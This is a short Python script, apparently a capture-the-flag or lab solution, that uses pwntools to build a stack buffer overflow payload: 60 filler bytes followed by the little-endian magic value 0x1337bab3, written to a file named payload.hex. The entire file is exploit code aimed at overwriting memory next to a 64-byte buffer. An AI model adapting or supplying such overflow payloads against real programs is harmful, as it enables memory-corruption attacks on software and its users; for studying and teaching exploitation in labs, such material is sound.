import pwn

buf_size = 64
# 1337bab3
payload = b'A' * 60 + b'\xb3\xba\x37\x13\n' 
with open ('payload.hex', 'wb') as f:
	f.write(payload)

